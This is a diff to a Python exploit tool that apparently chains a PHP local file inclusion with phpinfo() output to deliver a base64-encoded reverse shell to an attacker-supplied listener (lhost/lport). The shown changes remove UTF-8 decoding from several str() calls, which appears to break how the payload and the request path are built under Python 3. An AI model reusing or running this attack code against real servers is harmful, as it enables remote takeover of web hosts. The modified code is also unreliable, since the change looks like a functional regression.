@@ -188,13 +188,13 @@ def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
   except ValueError:
     return None
   try:
-    d= requests.get(LFI_PATH % str(fn, 'UTF-8'), verify=False,headers={'Connection':'close'},timeout=10).content
+    d= requests.get(LFI_PATH % str(fn), verify=False,headers={'Connection':'close'},timeout=10).content
   except requests.exceptions.ReadTimeout:
     return fn
   #d = http.request('GET', LFI_PATH % fn, timeout=5).data
   debug(d,VERBOSE)
   if d.find(bytes(TAG, 'UTF-8')) != -1:
-    debug("The rev shell output: "+ str(d, 'UTF-8'),VERBOSE)
+    debug("The rev shell output: "+ str(d),VERBOSE)
     return fn
   else:
     return None
@@ -265,7 +265,7 @@ def controll_log(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    base64revshell=str(base64.b64encode(TEMPLATES[args.ptype].encode()), 'UTF-8')
+    base64revshell=str(base64.b64encode(TEMPLATES[args.ptype].encode()))
 
     # define the end of lfi request
     if args.reqend != "":
@@ -375,7 +375,7 @@ def main(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    base64revshell=str(base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8')), 'UTF-8')
+    base64revshell=str(base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8')))
 
     # define the end of lfi request
     if args.reqend != "":
